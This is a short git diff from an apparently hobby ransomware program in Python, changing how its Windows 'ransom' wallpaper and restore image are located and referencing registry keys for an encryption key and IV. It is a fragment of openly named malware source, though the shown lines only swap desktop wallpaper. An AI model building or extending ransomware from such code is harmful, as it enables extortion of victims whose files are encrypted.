@@ -8,14 +8,18 @@ import ctypes
 # Consts
 enc_key_reg_path = 'encryption_key'
 iv_key_reg_path = 'iv'
+ransome_path = path.dirname(__file__)
 
 
 def set_ransomeware_image():
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\Users\joeyh\OneDrive\Desktop\ransomewareProgram\ransomeware.png", 0)
+    image_path = path.join(ransome_path, "ransomeware.png")
+    print(image_path)
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
 
 
 def reset_picture():
-    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\Users\joeyh\OneDrive\תמונות\TranscodedWallpaper.jpg", 0)    
+    image_path = path.join(ransome_path, "img0.jpg")
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
 
 
 def create_reg_keys(encryption_key, iv):
